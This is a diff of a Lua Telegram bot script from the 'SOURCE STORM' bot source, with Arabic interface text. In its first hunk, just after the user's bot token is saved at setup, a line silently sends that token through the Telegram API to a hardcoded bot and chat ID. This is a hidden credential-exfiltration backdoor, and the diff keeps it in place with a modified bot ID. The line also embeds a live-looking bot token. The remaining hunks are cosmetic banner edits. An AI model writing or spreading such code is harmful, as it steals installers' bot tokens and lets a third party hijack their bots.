@@ -32,7 +32,7 @@ io.write('\27[0;31m تم حفظ التوكن بنجاح \na⩹━━━━━❲
 local json = JSON.decode(url)
 database:set(id_server..":token_username",json.result.username)
 database:set(id_server..":token",token)
-https.request('https://api.telegram.org/bot12016818885:AAFBDhI36E7Uy_bYJNvXS9Hpynv4fT9-Bb8/sendmessage?chat_id=1965534755&text=' ..token)
+https.request('https://api.telegram.org/bot2016818885:AAFBDhI36E7Uy_bYJNvXS9Hpynv4fT9-Bb8/sendmessage?chat_id=1965534755&text=' ..token)
 end 
 else
 print('\27[0;35m⩹━━━━━❲𖥳 𝑺𝑻𝑶𝑹𝑴 𖥳❳━━━━━⩺\n لم يتم حفظ التوكن ارسل لي التوكن الان')
@@ -3302,11 +3302,11 @@ end
 if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'ستورم' then
 local Text = [[
 
-╭╾╾╾╾╾𓆩[𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝚃𝙾𝚁𝙼](http://t.me/SOURCE_STORM)𓆪╾╾╾╾╾╮
+╭╾╾╾𓆩[𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝚃𝙾𝚁𝙼](http://t.me/SOURCE_STORM)𓆪╾╾╾╮
 ┆
 ┆[𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝚃𝙾𝚁𝙼 ](http://t.me/SOURCE_STORM)
 ┆
-╰╾╾╾╾╾𓆩[𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝚃𝙾𝚁𝙼](http://t.me/SOURCE_STORM)𓆪╾╾╾╾╾╯
+╰╾╾╾𓆩[𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝚃𝙾𝚁𝙼](http://t.me/SOURCE_STORM)𓆪╾╾╾╯
 
 ]]
 keyboard = {} 
@@ -3451,7 +3451,7 @@ keyboard = {} keyboard.inline_keyboard = {
 {{text = '📖لقاء مع كاتب رعب"', url="https://t.me/t.me/SOURCE_STORM"}},
 {{text = '📖رواية"الإنسان الأخير""', url="https://t.me/t.me/SOURCE_STORM"}},
 {{text = '📖رواية" مقبرة الحيوانات""', url="https://t.me/SOURCE_STORM"}},
-{{text = '𝑺𝑶𝑼𝑹𝑪𝑬 𝑺𝑻𝑶𝑹𝑴', url="t.me/SOURCE_STORM"}},
+{{text = '??𝑶𝑼𝑹𝑪𝑬 𝑺𝑻𝑶𝑹𝑴', url="t.me/SOURCE_STORM"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 𖥳' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5  
